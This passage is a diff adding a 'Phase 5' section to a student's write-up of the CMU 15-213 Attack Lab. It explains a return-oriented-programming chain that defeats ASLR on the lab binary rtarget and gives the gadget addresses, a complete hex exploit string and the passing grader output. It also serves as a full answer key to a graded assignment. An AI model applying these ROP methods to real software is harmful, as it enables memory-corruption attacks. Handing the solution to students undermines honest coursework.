@@ -220,3 +220,43 @@ PASS: Would have posted the following:
 
 ## PHASE 5
 
+Phase 5 is the combination of phase 3 and phase 4, but we need to pop the _address_ of the string representation of cookie. But we can't find out the concrete address because of ASLR. So we need to copy `%rsp` in some register and find the gadget that will add some offset to this register (again, the idea about gadget that will add some offset was the idea of LLM).
+
+The offset can be written on the stack, then some gadget pops that offset, sets its value in register `%rsi` and calls `add_xy`, where `%rdi` is the pointer and `%rsi` is the offset (it can be also vice versa, but spoiler: the solution will use the variant where the offset is `%rsi`). Then the result pointer will be saved in `%rax` and our task is just to copy the value from `%rax` to `%rdi` (it was the main point of phase 4).
+
+By trial, error and endlessly searching through all the values ​​in the table in `attacklab.pdf` and 3 sheets of paper filled with writing, it was discovered that we need to execute these gadgets in this order:
+```assembly
+movq %rsp, %rax          ; gadget: 48 89 e0 c3,    address: 401a06
+movq %rax, %rdi          ; gadget: 48 89 c7 90 c3, address: 4019c5
+popq %rax                ; gadget: 58 90 c3,       address: 4019ab
+movl %eax, %edx          ; gadget: 89 c2 90 c3,    address: 4019dd
+movl %edx, %ecx          ; gadget: 89 d1 08 db c3, address: 401a69 (08 db--nop)
+movl %ecx, %esi          ; gadget: 89 ce 90 90 c3, address: 401a13
+leaq (%rdi,%rsi,1), %rax ; gadget: 48 8d 04 37 c3, address: 4019d6
+movq %rax, %rdi          ; gadget: 48 89 c7 90 c3, address: 4019c5 
+```
+
+Our last task is to determine the value of the offset. It is easy to see, that it will be 72 (or 0x48), because there are 8 gadgets and the `%rsp` value in the beginning points at the gadget 2 (when the gadget 1 executes). It is 56 (0x38), but after the gadget 3 there must be 8 bytes of the offset and hence 8+56=64 (0x8+0x38=0x40), but before the payload string (the string representation of cookie) there must be 8 more bytes -- the address of `touch3` function and so, 64+8=72 (0x40+0x8=0x48). So, all we need is to write values of characters at the position 72 bytes upper than `%rsp` when gadget 1 executes, and write the correct offset after the gadget 3.
+
+So, let's assemble the shellcode.
+```
+3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 06 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 69 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
+```
+
+Let's check it:
+```bash
+attack-lab / % ./hex2raw < solutions/phase5/phase5_bytes.txt > solutions/phase5/phase5_raw.txt
+attack-lab / % ./rtarget -q -i solutions/phase5/phase5_raw.txt
+```
+
+And it works!
+```
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
+```
